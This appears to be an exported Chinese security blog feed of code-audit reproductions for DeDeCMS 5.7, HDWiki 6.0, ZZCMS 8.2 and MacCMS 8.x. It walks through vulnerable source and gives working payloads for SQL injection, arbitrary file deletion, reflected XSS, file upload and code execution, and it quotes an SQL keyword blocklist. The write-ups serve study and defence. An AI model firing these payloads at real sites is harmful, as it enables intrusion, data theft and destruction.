fc0b3d5d37b5b53a2f911869147c78e22848e677f8f844846ebdb3de69558b716533d8a89f367e1a364e11f1ec362132b61551ae369548a4faaafdb5e08d5f2398bf6bab2964964c8fb2306321ea562c39505afc59551f339a181b3081e6ffb7f4f316a8bf71dea1b132f101a8962f7a6f46ed406afd34b98ea1de85d7671a1253d41f25c8134905fa6d1f78c67a1302e59e59d71b440efa80d5aee3609288e427154dadb904ff46d3af9468a39c4be990843ee07441007f0add0762710d3457739b5babd060e115420fd433b38c9d2d9b5f79549e4518c26013065722c7905e8e7d9defa4590dd0a5484d9b4da8c54f9515f3fc604bb2035df68c50e49a9c63579f9a2e9a5fe9eb7fbaf9771d56d35d9912ed329e070b49cd16eca641ae2804d191162c9ad6ab1813ad42b03f9fa627e637b6ed0d9e1aa0d6ffaa84e774dd08948b84907050b5343a02419164adbc69bf80053e23df3230e916362f7c4e645fa0ef0200b03c81f0ec8c2c308be97c77eb44eedf3b0499bd34fcc821b622393e054ef55d0ccbd50b9364279df6446ec139c4c1b1a54d093490237358fef86188d063f31a5562216892a5bd6abc574241c926bf9d10f77dd64d4d20c1887e0acdd00fa36bf4b2f918860bc70a0ebff0e6842cad07b0683566f3c26219089e7fd4b13abe166fe331781e46b8ccbc9685401c36c7549dda09f4f1f57a3fc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】DeDeCMS 5.7 SP2后台代码执行漏洞（复现）</title>
    <url>/code_audit/PHP/12.DeDeCMSV5.7%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="【代码审计】DeDeCMS-5-7-SP2后台代码执行漏洞（复现）">【代码审计】DeDeCMS 5.7 SP2后台代码执行漏洞（复现）</h1>
<h2 id="审计过程">审计过程</h2>
<p>漏洞文件发生在/dede/tpl.php中，程序直接将经过<code>stripslashes()</code>处理的<code>$content</code>写入了/include/taglib/xxx.lib.php文件。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210112164635.png" alt=""></p>
<p>这个文件的filename和content都没有定义，原因就在于全局变量注册的特性，在common.inc.php中定义了如何处理提交的参数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210112184907.png" alt=""></p>
<p>并且还对提交的参数进行addslashes函数的处理。</p>
<p>回到tpl.php这个文件，<code>csrf_check()</code>在/dede/config.php中定义，用于检测token，我们可以访问/dede/tpl.php?action=upload来获取token值</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210112195208.png" alt=""></p>
<p>访问：<code>http://localhost/dedecms/dede/tpl.php?action=savetagfile&amp;filename=ca01h.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=5d2d1d2007a09f3b753b794ed0976449</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210112195419.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<p><a href="https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/">https://mochazz.github.io/2018/03/08/代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞（复现）/</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】HDWiki6.0 SQL注入漏洞（复现）</title>
    <url>/code_audit/PHP/13.HDWiki6.0sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="【代码审计】HDWiki6-0-sql漏洞（复现）">【代码审计】HDWiki6.0 sql漏洞（复现）</h1>
<h2 id="审计过程">审计过程</h2>
<p>首先从index.php入手：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110220355.png" alt=""></p>
<p>包含了/model/hdwiki.class.php，这个文件是处理路由的关键文件，在构造函数中首先调用的是init_request.php，用来初始化请求信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_request</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!file_exists(HDWIKI_ROOT.<span class="string">&#x27;/data/install.lock&#x27;</span>)) &#123;</span><br><span class="line">			header(<span class="string">&#x27;location:install/install.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		header(<span class="string">&#x27;Content-type: text/html; charset=&#x27;</span>.WIKI_CHARSET);</span><br><span class="line">		$querystring=str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,urldecode($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]));</span><br><span class="line">		<span class="keyword">if</span>(strpos($querystring , <span class="string">&#x27;plugin-hdapi-hdapi-default&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">			$querystring=str_replace(<span class="string">&#x27;plugin-hdapi-&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $querystring);</span><br><span class="line">		&#125;</span><br><span class="line">		$pos = strpos($querystring , <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>($pos!==<span class="literal">false</span>)&#123;</span><br><span class="line">			$querystring=substr($querystring,<span class="number">0</span>,$pos);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;get = explode(<span class="string">&#x27;-&#x27;</span> , $querystring);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (count(<span class="keyword">$this</span>-&gt;get) &lt;= <span class="number">3</span> &amp;&amp; count($_POST) == <span class="number">0</span> &amp;&amp; substr($querystring, <span class="number">0</span>, <span class="number">6</span>) == <span class="string">&#x27;admin_&#x27;</span> &amp;&amp; substr($querystring, <span class="number">0</span>, <span class="number">10</span>) != <span class="string">&#x27;admin_main&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;querystring = $querystring;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;get[<span class="number">0</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;get[<span class="number">0</span>]=<span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;get[<span class="number">1</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;get[<span class="number">1</span>]=<span class="string">&#x27;default&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(count(<span class="keyword">$this</span>-&gt;get)&lt;<span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&#x27; Access Denied !&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//unset($_ENV, $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_COOKIE_VARS, $HTTP_SERVER_VARS, $HTTP_ENV_VARS);</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;get = <span class="keyword">string</span>::haddslashes(<span class="keyword">$this</span>-&gt;get,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;post = <span class="keyword">string</span>::haddslashes($_POST);</span><br><span class="line">		$_COOKIE = <span class="keyword">string</span>::haddslashes($_COOKIE);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;checksecurity();</span><br><span class="line">		$remain=<span class="keyword">array</span>(<span class="string">&#x27;_SERVER&#x27;</span>,<span class="string">&#x27;_FILES&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;GLOBALS&#x27;</span>,<span class="string">&#x27;starttime&#x27;</span>,<span class="string">&#x27;mquerynum&#x27;</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($GLOBALS <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">			<span class="keyword">if</span> ( !in_array($key,$remain) ) &#123;</span><br><span class="line">				<span class="keyword">unset</span>($GLOBALS[$key]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>看完这段代码，可以初步知道这个CMS是首先拿到query_string的值，再用连接符<code>-</code>来划分控制器和方法，形如：<code>http://127.0.0.1/index.php?admin_main-login</code>，表示的就是/control/admin_main.php文件中的dologin方法。</p>
<p>另外，还对GET、POST和COOKIE参数进行字符转义，以及检查GET请求中是否有下列关键字：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checksecurity</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		$check_array = <span class="keyword">array</span>(</span><br><span class="line">			<span class="comment">//于get请求 需要检查哪些关键词 </span></span><br><span class="line">			<span class="string">&#x27;get&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;cast&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;show &#x27;</span>,<span class="string">&#x27;show/*&#x27;</span>,<span class="string">&#x27;alter &#x27;</span>,<span class="string">&#x27;alter/*&#x27;</span>,<span class="string">&#x27;create &#x27;</span>,<span class="string">&#x27;create/*&#x27;</span>,<span class="string">&#x27;insert &#x27;</span>,<span class="string">&#x27;insert/*&#x27;</span>, <span class="string">&#x27;select &#x27;</span>,<span class="string">&#x27;select/*&#x27;</span>,<span class="string">&#x27;delete &#x27;</span>,<span class="string">&#x27;delete/*&#x27;</span>,<span class="string">&#x27;update &#x27;</span>, <span class="string">&#x27;update/*&#x27;</span>,<span class="string">&#x27;drop &#x27;</span>,<span class="string">&#x27;drop/*&#x27;</span>,<span class="string">&#x27;truncate &#x27;</span>,<span class="string">&#x27;truncate/*&#x27;</span>,<span class="string">&#x27;replace &#x27;</span>,<span class="string">&#x27;replace/*&#x27;</span>,<span class="string">&#x27;union &#x27;</span>,<span class="string">&#x27;union/*&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;declare&#x27;</span>, <span class="string">&#x27;varchar&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;%27&#x27;</span>, <span class="string">&#x27;%22&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>),</span><br><span class="line">		);</span><br><span class="line">		<span class="keyword">foreach</span> ($check_array <span class="keyword">as</span> $check_key=&gt;$check_val) &#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;$check_key)) &#123;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;$check_key <span class="keyword">as</span> $getvalue) &#123;</span><br><span class="line">					<span class="keyword">foreach</span> ($check_val <span class="keyword">as</span> $invalue) &#123;</span><br><span class="line">						<span class="keyword">if</span>(stripos($getvalue, $invalue) !== <span class="literal">false</span>)&#123;</span><br><span class="line">							<span class="keyword">$this</span>-&gt;notfound(<span class="string">&#x27;page is not found!&#x27;</span>);</span><br><span class="line">							<span class="comment">//exit(&#x27;No Aceess!注意敏感词!&#x27;);</span></span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这次出现SQL注入漏洞的地方是/control/edit.php中的docompare函数，触发这个函数的路由即为：<code>http://127.0.0.1/index.php?edit-compare</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110223810.png" alt=""></p>
<p>前三个if语句可以不用管。第四个if语句判断参数eid数组的前两个元素是不是数字，如果不是就会跳转到index.php页面。第147行代码，通过array_slice函数获取参数eid的前两个元素，代入到get_edition函数中。</p>
<p>这里有一个小的trick：<strong>POST和GET传入的参数，键不会自动排序的，传的时候是什么顺序，接收到的就是什么顺序</strong> ，也就是说传给get_edition()函数的参数是我们可以控制的，这是发生注入的关键之一。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110224855.png" alt=""></p>
<p>继续跟进get_edition函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110225119.png" alt=""></p>
<p>当get_edition()函数的参数是数组的时候，则会直接用逗号拼接数组中的所有值，然后直接带入数据库查询，这里就是发生注入的关键之二。所以我们最终的payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php?edition-compare HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.0.23</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.62 Safari&#x2F;537.36</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;jovcdmbvja39irn9a9rso7sru6; hd_sid&#x3D;lZLd3C; hd_auth&#x3D;1bc4Iyy%2BgM7glSiQe3yWq7wFPWdvuO4ZGw1vEvrrzMuWdTX1kXSaxhS54Lzd8pYu%2BBGftcSI3Yy6wuwCdyI7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line">eid[2]&#x3D;199&amp;eid[3]&#x3D;299) or if(ascii(left(user(),1))&#x3D;114,1,0)#&amp;eid[0]&#x3D;3&amp;eid[1]&#x3D;4</span><br></pre></td></tr></table></figure>
<p>使用布尔盲注，通过页面回显来判断查询语句的正确性。</p>
<h2 id="Reference">Reference</h2>
<p><a href="https://mochazz.github.io/2018/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BHDwiki6.0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/">https://mochazz.github.io/2018/03/05/代码审计之HDwiki6.0（复现）/</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】ZZCMS8.2（复现）</title>
    <url>/code_audit/PHP/11.ZZCMS8.2%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="【代码审计】ZZCMS8-2（复现）">【代码审计】ZZCMS8.2（复现）</h1>
<h2 id="SQL注入漏洞">SQL注入漏洞</h2>
<p>SQL注入漏洞首先看一下这个CMS防SQL注入的过滤代码，/inc/stopsqlin.php：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110141500.png" alt=""></p>
<p>只针对了POST、GET和COOKIE三个地方做了过滤。</p>
<p>/user/del.php首先包含了两个文件<code>../inc/conn.php</code>和<code>check.php</code>，其中<code>check.php</code>一共有五处SQL查询：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110141642.png" alt=""></p>
<p>其中第二处调用的<code>getip()</code>函数来获取查询参数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110141737.png" alt=""></p>
<p>这个地方并没有进行参数检查，所以可以通过X-Forwarded-For头部字段进行注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;user&#x2F;del.php HTTP&#x2F;1.1</span><br><span class="line">Host: zzcms:8888</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;zzcms:8888&#x2F;user&#x2F;logincheck.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;ba56df951ed3d63883d9006ca742fe0e; bdshare_firstime&#x3D;1609736297825; UserName&#x3D;test; PassWord&#x3D;098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">X-Forwarded-For: 1.1.1.1&#39;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>用SQLMAP跑</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110142739.png" alt=""></p>
<p>这种X-Forwarded-For注入还存在于/user/logincheckin.php和/admin/logincheckin.php中。</p>
<p>还是del.php文件，第137行的tablename不需要引号闭合，并且只经过trim函数的清洗，没有任何过滤：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110150003.png" alt=""></p>
<p>查询zzcms_answer表，使用union联合注入+延时注入，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&amp;tablename&#x3D;zzcms_answer where id&#x3D;999999999 union select 1,2 and if((ascii(substr(user(),1,1)) &#x3D; 114),sleep(3),1)#</span><br></pre></td></tr></table></figure>
<h2 id="任意文件删除漏洞">任意文件删除漏洞</h2>
<p>漏洞发生在/user/adv.php，<code>$f</code>变量直接由<code>&quot;../&quot;</code>与<code>$oldimg</code>拼接而得，并未过滤<code>.</code>和<code>/</code>字符，导致跨目录删除文件。所以按照代码逻辑，我们只要让<code>$img</code>不等于<code>$oldimg</code>，且<code>$action</code>等于”modify”即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110163916.png" alt=""></p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;adv.php?action&#x3D;modify HTTP&#x2F;1.1</span><br><span class="line">Host: zzcms:8888</span><br><span class="line">Content-Length: 110</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;zzcms:8888</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;zzcms:8888&#x2F;user&#x2F;adv.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;ba56df951ed3d63883d9006ca742fe0e; bdshare_firstime&#x3D;1609736297825; UserName&#x3D;test; PassWord&#x3D;098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">adv&#x3D;111&amp;advlink&#x3D;%2Fzt%2Fshow.php%3Fid%3D1&amp;company&#x3D;%E8%B5%9E%E5%8A%A9&amp;oldimg&#x3D;admin&#x2F;admin.php&amp;img&#x3D;test&amp;Submit22&#x3D;%E4%BF%AE+%E6%94%B9</span><br></pre></td></tr></table></figure>
<p>同样的漏洞也出现在license_save.php中：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110164402.png" alt=""></p>
<p>根据代码逻辑，$action=modify并且$old_img不等于$img和<code>/img/nopic.gif</code>，即可触发该漏洞。</p>
<h2 id="系统重装漏洞">系统重装漏洞</h2>
<p>在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之前的文件中，没有进行判断，导致系统重装漏洞：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110165058.png" alt=""></p>
<h2 id="反射型XSS漏洞">反射型XSS漏洞</h2>
<p>在inc/top.php中，没有包含<code>/inc/conn.php</code>和<code>check.php</code>两个文件，导致反射型XSS漏洞产生。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110165226.png" alt=""></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /inc/top.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: zzcms:<span class="number">8888</span></span><br><span class="line">Content-Length: <span class="number">89</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">11</span>_1_0) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">87.0</span><span class="number">.4280</span><span class="number">.88</span> Safari/<span class="number">537.36</span></span><br><span class="line">Origin: http:<span class="comment">//zzcms:8888</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://zzcms:8888/inc/top.php</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=ba56df951ed3d63883d9006ca742fe0e; bdshare_firstime=1609736297825; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">action=search&amp;lb=%23%27%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cscript%3E</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110165900.png" alt=""></p>
<h2 id="文件上传漏洞">文件上传漏洞</h2>
<p>/uploadimg.php文件提供了一个文件上传的功能，首先，先判断文件是否存在，再检查文件是否超过限制，接着检查文件类型，这里可以用GIF89a绕过检查，最后使用黑名单机制检查文件后缀，问题就出在这里，黑名单少过滤了phtml，而apache会将phtml文件按照php文件来解析。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110170123.png" alt=""></p>
<p>payload如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210110170534.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<p><a href="https://mochazz.github.io/2018/02/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bzzcms82/">https://mochazz.github.io/2018/02/12/代码审计之zzcms82/</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】苹果CMS8.X（复现）</title>
    <url>/code_audit/PHP/14.maccms8.x%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="【代码审计】苹果cms8-x（复现）">【代码审计】苹果cms8.x（复现）</h1>
<h2 id="审计过程">审计过程</h2>
<p>从index.php看起，首先就包含了两个文件：/inc/conn.php和/inc/common/360_safe3.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111094215.png" alt=""></p>
<p>/inc/conn.php包含了六个文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111094253.png" alt=""></p>
<ul>
<li>
<p>config.php是数据库db、ftp等等的配置信息；</p>
</li>
<li>
<p>cache.php是缓存文件；</p>
</li>
<li>
<p>class.php一共有三个类：AppDb、AppFtp和AppZip，都定义了各自的操作函数；</p>
</li>
<li>
<p>function.php都是一些功能函数；</p>
</li>
<li>
<p>template.php中有一个AppTpl类，并且新建了一个模板对象</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppTpl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $markname,$markpar,$markdes,$markval,$markhtml;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">AppTpl</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;P = <span class="keyword">array</span>(<span class="string">&quot;vodtypeid&quot;</span>=&gt;<span class="number">-1</span>,<span class="string">&quot;vodtypepid&quot;</span>=&gt;<span class="number">-1</span>,<span class="string">&quot;vodtopicid&quot;</span>=&gt;<span class="number">-1</span>,<span class="string">&quot;arttypeid&quot;</span>=&gt;<span class="number">-1</span>,<span class="string">&quot;arttypepid&quot;</span>=&gt;<span class="number">-1</span>,<span class="string">&quot;arttopicid&quot;</span>=&gt;<span class="number">-1</span>,<span class="string">&quot;auto&quot;</span>=&gt;<span class="literal">false</span>,<span class="string">&quot;pg&quot;</span>=&gt;<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">......</span><br><span class="line">$tpl = <span class="keyword">new</span> AppTpl();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>index.php包含的第二个文件/inc/common/360_safe3.php主要作用就是防止SQL注入和XSS：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111095214.png" alt=""></p>
<p>回到index.php中，接下来的代码就是定义路由规则</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111095308.png" alt=""></p>
<p>第14行调用了be函数，对提交的参数<code>$m</code>进行addslashes函数处理：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111095403.png" alt=""></p>
<p>再对提交的参数使用连接符<code>-</code>进行分割存到<code>$par</code>数组中，其中第一个元素是module，第二个元素是method，例如url：<code>http://127.0.0.1/?m=vod-type-id-2.html</code>表示的就是/inc/module/vod.php，并且method=type，<code>$tpl-&gt;P['id']=2</code>。</p>
<h3 id="代码执行">代码执行</h3>
<p>漏洞发生在<code>/inc/common/template.php</code>文件类方法<code>ifex()</code>中的eval语句：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111101438.png" alt=""></p>
<p>首先给出paylaod：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?m&#x3D;vod-search&amp;wd&#x3D;&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;</span><br></pre></td></tr></table></figure>
